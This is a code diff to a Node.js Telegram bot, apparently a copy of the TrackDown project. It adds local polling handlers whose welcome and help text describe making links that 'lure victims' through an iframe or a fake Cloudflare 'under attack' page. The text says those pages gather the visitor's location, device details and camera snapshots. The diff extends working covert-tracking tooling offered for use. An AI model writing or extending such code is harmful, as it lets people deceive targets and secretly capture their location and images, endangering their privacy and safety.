@@ -248,7 +248,7 @@ app.get("/c/:uid/:uri", async (req, res) => {
   }
 });
 
-// Telegram Bot Webhook Handler
+// Telegram Bot Webhook Handler for production
 app.post("/webhook", async (req, res) => {
   try {
     const update = req.body;
@@ -320,7 +320,65 @@ the url it will send you 2 links which you can use to track people.
 
 // For local development
 if (process.env.NODE_ENV !== "production") {
-  app.listen(5000, () => {
+  // Start polling for local testing
+  console.log("Starting polling for local development...");
+  bot.on('callback_query', async (callbackQuery) => {
+    await bot.answerCallbackQuery(callbackQuery.id);
+    
+    if (callbackQuery.data === "crenew") {
+      await createNew(callbackQuery.message.chat.id);
+    }
+  });
+  
+  bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    
+    // Handle reply to "Enter Your URL" message
+    if (msg.reply_to_message && msg.reply_to_message.text === "🌐 Enter Your URL") {
+      await createLink(chatId, msg.text);
+      return;
+    }
+    
+    // Handle /start command
+    if (msg.text === "/start") {
+      var m = {
+        reply_markup: JSON.stringify({
+          "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
+        })
+      };
+      
+      await bot.sendMessage(
+        chatId, 
+        `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, 
+        m
+      );
+    }
+    // Handle /create command
+    else if (msg.text === "/create") {
+      await createNew(chatId);
+    }
+    // Handle /help command
+    else if (msg.text === "/help") {
+      await bot.sendMessage(
+        chatId,
+        ` Through this bot you can track people just by sending a simple link.\n\nSend /create
+to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
+the url it will send you 2 links which you can use to track people.
+\n\nSpecifications.
+\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
+\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
+( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
+\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
+`
+      );
+    }
+  });
+  
+  // Start polling
+  bot.startPolling();
+  
+  // Start the server for the web routes
+  app.listen(5000, '0.0.0.0', () => {
     console.log("Server running on port 5000");
   });
 }
